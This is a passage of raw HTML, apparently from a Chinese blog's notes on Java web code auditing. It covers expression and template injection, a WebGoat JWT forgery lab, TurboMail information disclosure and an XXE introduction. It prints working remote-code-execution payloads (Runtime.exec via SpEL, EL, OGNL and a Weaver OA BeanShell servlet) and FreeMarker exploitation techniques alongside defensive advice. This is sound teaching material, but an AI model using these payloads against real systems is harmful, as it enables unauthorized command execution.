class="hljs-string">&quot;T(java.lang.Runtime).getRuntime().exec(/&quot;</span>calc/<span class="hljs-string">&quot;)&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> parser.parseExpression(expression).getValue().toString();<br><br></code></pre></td></tr></table></figure><h4 id="10-JSP-JSTL-EL"><a href="#10-JSP-JSTL-EL" class="headerlink" title="10.JSP JSTL_EL"></a>10.JSP JSTL_EL</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;spring:message text=<span class="hljs-string">&quot;$&#123;/&quot;</span>/<span class="hljs-string">&quot;.getClass().forName(/&quot;</span>java.lang.Runtime/<span class="hljs-string">&quot;).getMethod(/&quot;</span>getRuntime/<span class="hljs-string">&quot;,null).invoke(null,null).exec(/&quot;</span>calc/<span class="hljs-string">&quot;,null).toString()&#125;&quot;</span>&gt;<br>&lt;/spring:message&gt;<br></code></pre></td></tr></table></figure><h4 id="11-Elasticsearch-MVEL"><a href="#11-Elasticsearch-MVEL" class="headerlink" title="11.Elasticsearch MVEL"></a>11.Elasticsearch MVEL</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">login.<span class="hljs-keyword">do</span>?message=<span class="hljs-meta">@org</span>.apache.commons.io.IOUtils<span class="hljs-meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;whoami&#x27;).getInputStream())</span><br></code></pre></td></tr></table></figure><h4 id="12-泛微OA-EL表达式注入"><a href="#12-泛微OA-EL表达式注入" class="headerlink" title="12.泛微OA EL表达式注入"></a>12.泛微OA EL表达式注入</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">login.<span class="hljs-keyword">do</span>?message=<span class="hljs-meta">@org</span>.apache.commons.io.IOUtils<span class="hljs-meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;whoami&#x27;).getInputStream())</span><br></code></pre></td></tr></table></figure><p>或者POST</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">message=(#_memberAccess=<span class="hljs-meta">@ognl</span>.OgnlContext<span class="hljs-meta">@DEFAULT_MEMBER_ACCESS</span>).(#w=#context.get(<span class="hljs-string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter()).(#w.print(<span class="hljs-meta">@org</span>.apache.commons.io.IOUtils<span class="hljs-meta">@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream())</span>)).(#w.close())&amp;cmd=whoami<br></code></pre></td></tr></table></figure><p>还有一种</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">POST /weaver/bsh.servlet.BshServlet<br>bsh.script=eval%<span class="hljs-number">00</span>(<span class="hljs-string">&quot;ex&quot;</span>%2b<span class="hljs-string">&quot;ec(\\&quot;</span>cmd+/c+calc\\<span class="hljs-string">&quot;)&quot;</span>);&amp;bsh.servlet.captureOutErr=<span class="hljs-literal">true</span>&amp;bsh.servlet.output=raw<br></code></pre></td></tr></table></figure><h4 id="13-绕过"><a href="#13-绕过" class="headerlink" title="13.绕过"></a>13.绕过</h4><ol><li>反射</li><li>unicode</li><li>八进制</li></ol><h3 id="5-1-6-模板注入"><a href="#5-1-6-模板注入" class="headerlink" title="5.1.6　模板注入"></a>5.1.6　模板注入</h3><p>Web应用程序中广泛使用模板引擎来进行页面的定制化呈现，用户可以通过模板定制化展示符合自身特征的页面。模板引擎支持页面定制展示的同时也带来了一定安全风险。</p><h4 id="服务端模板注入攻击"><a href="#服务端模板注入攻击" class="headerlink" title="服务端模板注入攻击"></a>服务端模板注入攻击</h4><h5 id="概述"><a href="#概述" class="headerlink" title="概述"></a><strong>概述</strong></h5><p>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。与此同时，它也扩展了黑客的攻击面。除了常规的 XSS 外，注入到模板中的代码还有可能引发 RCE（远程代码执行）。通常来说，这类问题会在博客，CMS，wiki 中产生。虽然模板引擎会提供沙箱机制，攻击者依然有许多手段绕过它。在这篇文章中，我将会攻击几个模板引擎来说明该类漏洞，并展示沙箱逃逸技术。</p><h5 id="什么是服务端模板注入"><a href="#什么是服务端模板注入" class="headerlink" title="什么是服务端模板注入"></a><strong>什么是服务端模板注入</strong></h5><p>通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式。就拿一个销售软件来说，我们假设它会发送大量的邮件给客户，并在每封邮件前SKE插入问候语，它会通过Twig（一个模板引擎）做如下处理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$output</span> = <span class="hljs-variable">$twig</span>-&gt;<span class="hljs-title function_ invoke__">render</span>( <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;custom_email&#x27;</span>] , <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;first_name&quot;</span> =&gt; <span class="hljs-variable">$user</span>.first_name) );<br></code></pre></td></tr></table></figure><p>有经验的读者可能迅速发现 XSS，但是问题不止如此。这行代码其实有更深层次的隐患，假设我们发送如下请求：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">custom_email=&#123;&#123;7*7&#125;&#125; // GET 参数<br> <br>49  // $output 结果<br></code></pre></td></tr></table></figure><p>还有更神奇的结果：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">custom_email=&#123;&#123;self&#125;&#125; // GET 参数<br> <br>Object of class<br>__TwigTemplate_7ae62e582f8a35e5ea6cc639800ecf15b96c0d6f78db3538221c1145580ca4a5 could not be converted to string // 错误<br></code></pre></td></tr></table></figure><p>我们不难猜到服务器执行了我们传过去的数据。每当服务器用模板引擎解析用户的输入时，这类问题都有可能发生。除了常规的输入外，攻击者还可以通过 LFI（文件包含）触发它。模板注入和 SQL 注入的产生原因有几分相似——都是将未过滤的数据传给引擎解析。</p><p>为什么我们在模板注入前加“服务端”呢？这是为了和 jQuery，KnockoutJS 产生的客户端模板注入区别开来。通常的来讲，前者甚至可以让攻击者执行任意代码，而后者只能 XSS。</p><h6 id="模板注入的手法"><a href="#模板注入的手法" class="headerlink" title="模板注入的手法"></a><strong>模板注入的手法</strong><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204212132831.png" alt="img"></h6><p><strong>1：探测漏洞</strong></p><p>漏洞一般出现在这两种情况下，而每种有不同的探测手法</p><p><strong>文本类</strong></p><p>大部分的模板语言支持我们输入 HTML，比如：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs SAS">smarty=Hello &#123;user.name&#125;<br>Hello user1<br> <br>freemarker=Hello $&#123;username&#125;<br>Hello newuser<br> <br>any=&lt;b&gt;Hello&lt;/b&gt;<br>&lt;b&gt;Hello&lt;b&gt;<br></code></pre></td></tr></table></figure><p>未经过滤的输入会产生 XSS，我们可以利用 XSS 做我们最基本的探针。除此之外，模板语言的语法和 HTML 语法相差甚大，因此我们可以用其独特的语法来探测漏洞。虽然各种模板的实现细节不大一样，不过它们的基本语法大致相同，我们可以发送如下 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs smarty">smarty=Hello $&#123;7*7&#125;<br>Hello 49<br> <br>freemarker=Hello $&#123;7*7&#125;<br>Hello 49<br></code></pre></td></tr></table></figure><p>更多详见</p><p><a href="https://zhuanlan.zhihu.com/p/28823933">https://zhuanlan.zhihu.com/p/28823933</a></p><h4 id="FreeMarker模板注入"><a href="#FreeMarker模板注入" class="headerlink" title="FreeMarker模板注入"></a>FreeMarker模板注入</h4><p>FreeMarker模板文件如同HTML页面一样，是静态页面，普通用户访问该页面时，FreeMarker引擎进行解析并动态替换模板中的内容进行渲染，随后将渲染出的结果发送到访问者的浏览器中。FreeMarker的工作原理如图5-12所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211558189.png" alt="image-20220421155850109"></p><p>图5-12　FreeMarker的工作原理</p><p>FreeMarker模板语言（FTL）由4个部分组成。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">文本：文本会原样输出。<br>插值：这部分的输出会被模板引擎计算得到的值进行替换。<br>FTL标签：FTL标签与<span class="hljs-selector-tag">HTML</span>标签相似，但是它们是给FreeMarker的指示，而且不会打印在输出内容中。<br>注释：注释与<span class="hljs-selector-tag">HTML</span>的注释也很相似。注释会被FreeMarker直接忽略，更不会在输出内容中显示。<br></code></pre></td></tr></table></figure><h5 id="（1）内建函数的利用。"><a href="#（1）内建函数的利用。" class="headerlink" title="（1）内建函数的利用。"></a>（1）内建函数的利用。</h5><p>虽然FreeMarker中预制了大量的内建函数，极大地增强和拓展了模板的语言功能，但也可能引发一些危险操作。若研发人员不加以限制，则很可能产生安全隐患。</p><h5 id="（2）new函数的利用。"><a href="#（2）new函数的利用。" class="headerlink" title="（2）new函数的利用。"></a>（2）new函数的利用。</h5><p>new函数可以创建一个继承自freemarker.template.TemplateModel 类的实例，查阅源码会发现freemarker.template.utility.Execute#exec可以执行任意代码，因此可以通过new函数实例化一个Execute对象并执行exec()方法造成任意代码被执行，如图5-13所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211603941.png" alt="image-20220421160301767"></p><p>图5-13　freemarker.template.utility.Execute#exec可以执行任意代码</p><p>Payload代码如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211605748.png" alt="image-20220421160503685"></p><p>表5-3　freemarker.template.utility包中用来执行恶意代码的几个类<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211609857.png" alt="image-20220421160907776"></p><h5 id="（3）api函数的利用。"><a href="#（3）api函数的利用。" class="headerlink" title="（3）api函数的利用。"></a>（3）api函数的利用。</h5><p>api函数可以用来访问Java API，使用方法为value?api.someJavaMethod()，相当于value.someJavaMethod()。因此可以利用api函数通过getClassLoader来获取一个类加载器，进而加载恶意类。也可以通过getResource来读取服务器上的资源文件。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211611936.png" alt="image-20220421161153765"></p><h5 id="（4）OFCMS-1-1-2版本注入漏洞。"><a href="#（4）OFCMS-1-1-2版本注入漏洞。" class="headerlink" title="（4）OFCMS 1.1.2版本注入漏洞。"></a>（4）OFCMS 1.1.2版本注入漏洞。</h5><p>OFCMS 是Java 版CMS系统。FCMS 1.1.3之前的版本（如OFCMS 1.1.2版本）使用Freemarker作为模板引擎，然而开发者未对网站后台的“模板文件”功能处的“所存储的模板数据”进行过滤，导致攻击者可以使用FreeMarker模板注入的方式获取WebShell。</p><h5 id="（5）漏洞定位。"><a href="#（5）漏洞定位。" class="headerlink" title="（5）漏洞定位。"></a>（5）漏洞定位。</h5><p>该漏洞出现的文件路径为oufu-ofcms-V1.1.2\ofcms\ofcms-admin\src\main\Java\com\ofsoft\cms\admin\controller\cms\TemplateController.Java，通过在TemplateController类的save()方法设置断点可以发现，save()方法未对存入模板的数据进行充足的过滤，攻击者可以将可执行系统命令的恶意代码存入Freemarker模板。具体位置如图5-14所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211613792.png" alt="image-20220421161323680"></p><h5 id="（6）防御。"><a href="#（6）防御。" class="headerlink" title="（6）防御。"></a>（6）防御。</h5><p>官方针对new和api的两种利用方式发布了一些安全策略，从版本2.3.22开始，api_builtin_enabled的默认值为false，这意味着api内建函数在此之后不能随意使用。官方还提供了3个预定义的解析器来限制new函数对类的访问，具体如下。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">UNRESTRICTED_RESOLVER：简单地调用ClassUtil<span class="hljs-selector-class">.forName</span>(String)。<br>SAFER_RESOLVER：与第一个类似，但禁止解析ObjectConstructor、Execute和freemarker<span class="hljs-selector-class">.template</span><span class="hljs-selector-class">.utility</span>.JythonRuntime。<br>ALLOWS_NOTHING_RESOLVER：禁止解析任何类。<br></code></pre></td></tr></table></figure><p>同时官方手册中也回答了“允许用户上传模板文件会造成怎样的风险？”，该回答表明了应当限制普通用户可以上传和编辑模板文件的权限。OFCMS 1.1.2版本注入漏洞正是因为可编辑模板文件造成的任意代码执行。</p><h2 id="5-2-失效的身份认证"><a href="#5-2-失效的身份认证" class="headerlink" title="5.2　失效的身份认证"></a>5.2　失效的身份认证</h2><h3 id="5-2-1-失效的身份认证漏洞简介"><a href="#5-2-1-失效的身份认证漏洞简介" class="headerlink" title="5.2.1　失效的身份认证漏洞简介"></a>5.2.1　失效的身份认证漏洞简介</h3><p>失效的身份认证是指错误地使用应用程序的身份认证和会话管理功能，使攻击者能够破译密码、密钥或会话令牌，或者利用其他开发漏洞暂时或长久地冒充其他用户的身份，导致攻击者可以执行受害者用户的任何操作。</p><p>失效的身份认证其实是指令牌等设计不合理，为攻击者提供了可乘之机。用户身份认证和会话管理是一个应用程序中最关键的过程，有缺陷的设计会严重破坏这个过程。在开发Web应用程序时，开发人员往往只关注Web应用程序所需的功能。</p><h3 id="5-2-2-WebGoat8-JWT-Token猜解实验"><a href="#5-2-2-WebGoat8-JWT-Token猜解实验" class="headerlink" title="5.2.2　WebGoat8 JWT Token猜解实验"></a>5.2.2　WebGoat8 JWT Token猜解实验</h3><p>在进行“身份认证”方面的漏洞挖掘时，“黑白盒结合”审计的方法往往能产生不错的效果。读者可以通过OWASP 的Java Web攻防靶场“WebGoat”的一个“JWT tokens”攻击案例来初步了解“失效的身份认证”这一漏洞类型的黑白盒审计。</p><p>在黑盒测试方面，为了便于搭建漏洞复现环境，我使用了GitHub页面提供的Docker命令：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker <span class="hljs-keyword">run</span><span class="language-bash"> -p 9090:9090 -e TZ=Europe/Amsterdam webgoat/goatandwolf</span><br></code></pre></td></tr></table></figure><p>在启动容器后，即可创建用户并进行实验。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204212253486.png" alt="image-20220421225311189"></p><p>在白盒测试方面，我们可以在该GitHub页面下载源码，并使用IDEA等工具进行代码审计。</p><p>这里分享的案例来自于“(A2)Broken Authentication&#x2F;JWTtokens”，如图5-15所示。</p><p>可以看到，这个关卡的主要任务是“Try to change the token youreceive and become an admin user by changing the token andonce you are admin reset the votes”（尝试修改你的token以获得管理员权限，并重置投票）。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204212352884.png" alt="image-20220421235206755"></p><p>图5-15　白盒测试的案例</p><p>在此案例中，通过抓取“重置投票”的HTTP请求数据包，以期在找到关键的接口信息后进行定向的代码审计；通过Burp Suite抓取“Guest用户重置投票”按钮的数据包。通过观察，可以发现“重置投票”的接口是“POST &#x2F;WebGoat&#x2F;JWT&#x2F;votings”，如图5-16所示。</p><p>为了在源码中快速定位到该接口对应的方法，可以通过IDEA的功能“Find in Path”对接口的关键字符串“&#x2F;votings”进行查找，如图5-17和图5-18所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204212352149.png" alt="image-20220421235236089"></p><p>图5-16　“重置投票”的接口<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204212352511.png" alt="image-20220421235251395"></p><p>图5-17　“Find in Path功能”</p><p>由图5-18可知，注解“@PostMapping(“&#x2F;JWT&#x2F;voting”)”关联的是类org.owasp. webgoat.jwt.JWTVotesEndpoint的方法“resetVotes”，且该方法的返回类型是AttackResult。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204212353153.png" alt="image-20220421235342037"></p><p>图5-18　resetVotes方法</p><p>该resetVotes方法的示例代码如图5-19所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204212354074.png" alt="image-20220421235432984"></p><p>图5-19　resetVotes方法的示例代码</p><p>由图可知，“Jwt jwt &#x3D;Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);”这行代码通过签名密钥解析请求过来的JWT（accessToken），获取claims中的admin参数的值。若“Boolean.valueOf((String)claims.get(“admin”))”的返回值为true，则判断该token是有效的，并将进行“重置投票”操作。</p><p>在“Jwt jwt &#x3D;Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);”代码行中，JWT_PASSWORD是常量（字符串“victory”的BASE64编码），如图5-20所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204212354211.png" alt="image-20220421235456092"></p><p>图5-20　JWT_PASSWORD是常量</p><p>那么变量accessToken从何而来呢？通过resetVotes方法的注解，可以发现该变量储存于Cookie中，且Cookie的键名为“access_token”，如图5-21所示。</p><p>并且，该Cookie对象是在login方法中被创建，如图5-22所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220008905.png" alt="image-20220422000842802"></p><p>图5-21　Cookie的键名为“access_token”<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220009866.png" alt="image-20220422000905271"></p><p>图5-22　在login方法中创建Cookie对象</p><p>在图5-23中，Guest用户的access_token为空，并且在发送HTTP请求后，“lessonCompleted”的结果是“false”，且“feedback”的结果是“Not a valid JWT token, please try again”。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220012091.png" alt="image-20220422001230982"></p><p>图5-23　Guest用户的access_token为空</p><p>此时，使用用户“Jerry”进行“重置投票”的操作，并使用BurpSuite抓取该HTTP请求包，如图5-24所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220012639.png" alt="image-20220422001246504"></p><p>图5-24　重置投票并抓取HTTP请求包</p><p>此时，可以发现用户Jerry的access_token不为空，但在发送HTTP请求后，“lessonCompleted”的结果也是“false”，而“feedback”的结果是“Only an admin user can reset thevotes”，如图5-25所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220013969.png" alt="image-20220422001312847"></p><p>图5-25　发送HTTP请求包后的结果</p><p>此时，可以将JWT格式的access_token放置到网站上进行分析，如图5-26所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220013380.png" alt="image-20220422001327270"></p><p>图5-26　在网站中分析access_token</p><p>由图5-26可知，该JWT的HEADER、PAYLOAD与VERIFYSIGNATURE被解析出来了。</p><p>接下来，依据前面的分析，将“admin”的值赋为“true”，将“secret”赋值为“victory”，如图5-27所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220014949.png" alt="image-20220422001411834"></p><p>接下来，将页面新生成的JWT放到Burp Suite的HTTP请求包中，并进行数据包重放。此时，“lessonCompleted”的结果变成“true”，而“feedback”的结果则变成“Congratulations. Youhave successfully completed the assignment.”，这意味着我们通过了JWT Token校验，如图5-28所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220014540.png" alt="image-20220422001424413"></p><p>5-28　通过了JWT Token校验</p><h2 id="5-3-敏感信息泄露"><a href="#5-3-敏感信息泄露" class="headerlink" title="5.3　敏感信息泄露"></a>5.3　敏感信息泄露</h2><h3 id="5-3-1-敏感信息泄露简介"><a href="#5-3-1-敏感信息泄露简介" class="headerlink" title="5.3.1　敏感信息泄露简介"></a>5.3.1　敏感信息泄露简介</h3><p>敏感信息是业务系统中对保密性要求较高的数据，通常包括系统敏感信息以及应用敏感信息。系统敏感信息指的是业务系统本身的基础环境信息，例如系统信息、中间件版本、代码信息，这些数据的泄露可能为攻击者提供更多的攻击途径与方法。应用敏感信息可被进一步划分为个人敏感信息和非个人敏感信息，个人敏感信息包括身份证、姓名、电话号码、邮箱等，非个人敏感信息则可能是企事业单位甚至国家层面的敏感信息。在实际场景中，经常发生因研发人员疏忽而导致的敏感信息泄露。</p><h3 id="5-3-2-TurboMail-5-2-0敏感信息泄露"><a href="#5-3-2-TurboMail-5-2-0敏感信息泄露" class="headerlink" title="5.3.2　TurboMail 5.2.0敏感信息泄露"></a>5.3.2　TurboMail 5.2.0敏感信息泄露</h3><p>TurboMail邮件系统是某面向企事业单位通信需求而研发的电子邮件服务器系统。该系统的5.2.0版本没有进行充分的权限验证，使每个用户都可以通过访问接口获知“当前已经登录过的用户的邮箱地址”。由于在邮箱的登录页面没有设置验证码，如果用户的密码强度不够，攻击者可能进行爆破登录。</p><p>通过查看TurboMail的安装路径，可以发现TurboMail是Java EE工程，通过审计web.xml，可以发现url-pattern“mailmain”对应servlet-name“mailmaini”，如图5-29所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220015489.png" alt="image-20220422001559376"></p><p>图5-29　url-pattern“mailmain”对应servlet-name“mailmaini”</p><p>计servlet-name“mailmaini”所对应的类servlet-class，可以发现它对应类“turbomail.web.MailMain”，如图5-30所示。（同在web.xml下）<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220030464.png" alt="image-20220422003032361"></p><p>图5-30　审计servlet-class类</p><p>为了找到类“turbomail.web.MailMain”，对该Web应用所依赖的Jar包进行搜索，如图5-31所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220033827.png" alt="image-20220422003316801"></p><p>图5-31　在Jar包中搜索“turbomail.web.MailMain”类</p><p>从文件名的含义可以假设类“turbomail.web.MailMain”位于Jar包“turbomail. jar”中。</p><p>&#x3D;&#x3D;使用JD-GUI对web\webapps\ROOT\WEB-INF\lib下的“turbomail.jar”进行反编译&#x3D;&#x3D;，可以发现“MailMain”位于该Jar包中（turbomail\web\MailMain.Java），如图5-32所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220034992.png" alt="image-20220422003410866"></p><p>图5-32　对“turbomail.jar”进行反编译</p><p>对MailMain进行审计，可以发现MailMain继承自HttpServlet类，且会接收一个名为type的请求参数，如图5-33所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220043687.png" alt="image-20220422004340541"></p><p>图5-33　对MailMain进行审计</p><p>当出现“type.equals(“pm”)”时，会调用PMAdmin的show方法，如图5-34所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220047647.png" alt="image-20220422004734844"></p><p>图5-34　调用PMAdmin的show方法</p><p>对PMAdmin的show方法进行审计，可以发现如下代码在输出数据前并没有进行权限验证，即任何人都可以发送请求，如图5-35所示<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220050882.png" alt="image-20220422005012775"></p><p>图5-35　对PMAdmin的show方法进行审计</p><p>通过浏览器访问地址：<a href="http://192.168.8.43:8080/mailmain?type=pm%EF%BC%88%E5%85%B6%E4%B8%ADhttp://">http://192.168.8.43:8080/mailmain?type=pm（其中http://</a> 192.168.8.43:8080&#x2F;是邮件系统登录页），可以发现“<a href="mailto:&#106;&#x61;&#x6b;&#101;&#64;&#109;&#121;&#x74;&#101;&#115;&#x74;&#46;&#99;&#x6e;">&#106;&#x61;&#x6b;&#101;&#64;&#109;&#121;&#x74;&#101;&#115;&#x74;&#46;&#99;&#x6e;</a>”和“sophia@ mytest.cn”这两个已经登录过的用户的邮箱地址被显示出来。由于无须身份认证即可访问该接口，因此已经造成敏感信息泄露，如图5-36所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220052490.png" alt="image-20220422005203388"></p><p>图5-36　敏感信息泄露</p><h3 id="5-3-3-开发组件敏感信息泄露"><a href="#5-3-3-开发组件敏感信息泄露" class="headerlink" title="5.3.3　开发组件敏感信息泄露"></a>5.3.3　开发组件敏感信息泄露</h3><p>若研发人员未做好“自定义错误页面”的工作，就容易将网站的敏感信息暴露到前端。攻击者很可能利用这些敏感信息进行新的攻击尝试。</p><p>这里以一个未设置“自定义错误页”的Spring Boot的小工程为例，在注入恶意paylaod后，小工程将数据库MySQL、持久化框架MyBatis以及对应的数据库查询语句暴露在前端，如图5-37所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204220055947.png" alt="image-20220422005531845"></p><p>图5-37　自定义错误页的示例</p><p>显然，将这些信息展现给普通用户毫无意义，并且会为系统带来安全隐患。</p><h3 id="5-3-4-小结"><a href="#5-3-4-小结" class="headerlink" title="5.3.4　小结"></a>5.3.4　小结</h3><p>敏感信息泄露是攻击者所希望看到的。网站的敏感信息漏洞包括但不仅限于：数据库中的用户名与密码的信息泄露、SQL注入报错。事实上，我们常见的目录穿越、任意文件读取等漏洞也可以被称为敏感信息泄露漏洞。攻击者通过“敏感信息泄露”漏洞打“组合拳”，可能造成巨大的危害。建议读者朋友在进行代码审计时重视这类漏洞。</p><h2 id="5-4-XML-外部实体注入（XXE）"><a href="#5-4-XML-外部实体注入（XXE）" class="headerlink" title="5.4　XML 外部实体注入（XXE）"></a>5.4　XML 外部实体注入（XXE）</h2><h3 id="了解xml和dtd"><a href="#了解xml和dtd" class="headerlink" title="了解xml和dtd"></a>了解xml和dtd</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzU2NDY2OTU4Nw==&mid=2247497017&idx=1&sn=0214882ac0b57d19c282ed05fceea543&chksm=fc45c8c5cb3241d3e2839482443d878649b726093c417b90e88ed661098c9b87c2ffb095d9d6&mpshare=1&scene=23&srcid=0421QOgFTmE5FSLSXAYebVhD&sharer_sharetime=1650499427648&sharer_shareid=ee83a55e0b955b99e8343acbb61916b7#rd">https://mp.weixin.qq.com/s?__biz=MzU2NDY2OTU4Nw==&amp;mid=2247497017&amp;idx=1&amp;sn=0214882ac0b57d19c282ed05fceea543&amp;chksm=fc45c8c5cb3241d3e2839482443d878649b726093c417b90e88ed661098c9b87c2ffb095d9d6&amp;mpshare=1&amp;scene=23&amp;srcid=0421QOgFTmE5FSLSXAYebVhD&amp;sharer_sharetime=1650499427648&amp;sharer_shareid=ee83a55e0b955b99e8343acbb61916b7#rd</a></p><h4 id="0x01-简单了解XML"><a href="#0x01-简单了解XML" class="headerlink" title="0x01:简单了解XML"></a>0x01:简单了解XML</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">XML</span> <span class="hljs-title">指可扩展标记语言（EXtensible</span> Markup Language）<br><span class="hljs-keyword">XML</span> <span class="hljs-title">是一种标记语言，很类似 HTML</span><br><span class="hljs-keyword">XML</span> <span class="hljs-title">被设计为传输和存储数据，其焦点是数据的内容</span><br><span class="hljs-title">XML</span> 被设计用来结构化、存储以及传输信息<br><span class="hljs-keyword">XML</span> <span class="hljs-title">允许创作者定义自己的标签和自己的文档结构</span><br></code></pre></td></tr></table></figure><p><strong>XML的优点：</strong></p><p><code>xml</code>是互联网数据传输的重要工具，它可以跨越互联网任何的平台，不受编程语言和操作系统的限制，非常适合Web传输，而且xml有助于在服务器之间穿梭结构化数据，方便开发人员控制数据的存储和传输。</p><p><strong>XML的特点及作用：</strong></p><p><strong>特点：</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> xml与操作系统、编程语言的开发平台都无关<br><span class="hljs-bullet"> 2.</span> 实现不同系统之间的数据交互<br></code></pre></td></tr></table></figure><p><strong>作用：</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 配置应用程序和网站<br><span class="hljs-bullet"> 2.</span> 数据交互<br></code></pre></td></tr></table></figure><p>而且在配置文件里边所有的配置文件都是以<code>XMl</code>的格式来编写的，跨平台进行数据交互，它可以跨操作系统，也可以跨编程语言的平台,所以可以看出XML是非常方便的，应用的范围也很广，但如果存在漏洞，那危害就不言而喻了。</p><p><strong>XML语法、结构与实体引用：</strong></p><p><strong>语法：</strong></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>.XML元素都必须有关闭标签。<br><span class="hljs-number">2</span>.<span class="hljs-keyword">XML</span> <span class="hljs-title">标签对大小写敏感。</span><br><span class="hljs-title">3</span>.<span class="hljs-keyword">XML</span> <span class="hljs-title">必须正确地嵌套。</span><br><span class="hljs-title">4</span>.<span class="hljs-keyword">XML</span> <span class="hljs-title">文档必须有根元素。</span><br><span class="hljs-title">5</span>.<span 